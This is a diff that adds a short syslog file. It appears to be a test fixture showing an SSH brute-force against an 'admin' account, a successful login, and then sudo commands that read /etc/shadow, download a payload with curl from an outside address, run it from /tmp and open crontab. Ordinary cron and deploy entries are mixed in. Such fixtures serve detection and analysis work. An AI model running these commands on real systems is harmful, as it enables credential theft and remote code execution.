@@ -1,0 +1,20 @@
+<38>Mar 15 02:14:01 webserver01 sshd[12301]: Failed password for admin from 203.0.113.42 port 54322 ssh2
+<38>Mar 15 02:14:09 webserver01 sshd[12302]: Failed password for admin from 203.0.113.42 port 54323 ssh2
+<38>Mar 15 02:14:17 webserver01 sshd[12303]: Failed password for admin from 203.0.113.42 port 54324 ssh2
+<38>Mar 15 02:14:25 webserver01 sshd[12304]: Failed password for admin from 203.0.113.42 port 54325 ssh2
+<38>Mar 15 02:14:33 webserver01 sshd[12305]: Failed password for admin from 203.0.113.42 port 54326 ssh2
+<38>Mar 15 02:14:41 webserver01 sshd[12306]: Failed password for admin from 203.0.113.42 port 54327 ssh2
+<38>Mar 15 02:14:49 webserver01 sshd[12307]: Failed password for admin from 203.0.113.42 port 54328 ssh2
+<38>Mar 15 02:14:57 webserver01 sshd[12308]: Failed password for admin from 203.0.113.42 port 54329 ssh2
+<14>Mar 15 02:15:05 webserver01 sshd[12309]: Accepted password for admin from 203.0.113.42 port 54330 ssh2
+<14>Mar 15 02:15:05 webserver01 sshd[12309]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+<14>Mar 15 02:15:10 webserver01 sudo[12350]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id
+<14>Mar 15 02:15:14 webserver01 sudo[12351]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
+<14>Mar 15 02:15:20 webserver01 sudo[12352]: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://203.0.113.99/payload
+<14>Mar 15 02:15:25 webserver01 sudo[12353]: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/payload.sh
+<14>Mar 15 02:15:30 webserver01 sudo[12354]: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/crontab -e
+<30>Mar 15 01:00:01 webserver01 cron[9001]: (root) CMD (run-parts /etc/cron.hourly)
+<30>Mar 15 01:30:01 webserver01 cron[9002]: (root) CMD (/usr/lib/update-notifier/apt-check)
+<14>Mar 15 00:01:01 webserver01 kernel[0]: eth0: renamed from veth123abc
+<14>Mar 15 00:01:02 webserver01 systemd[1]: Started Session 42 of user www-data.
+<14>Mar 15 01:45:10 webserver01 sshd[11900]: Accepted publickey for deploy from 10.0.0.5 port 22 ssh2
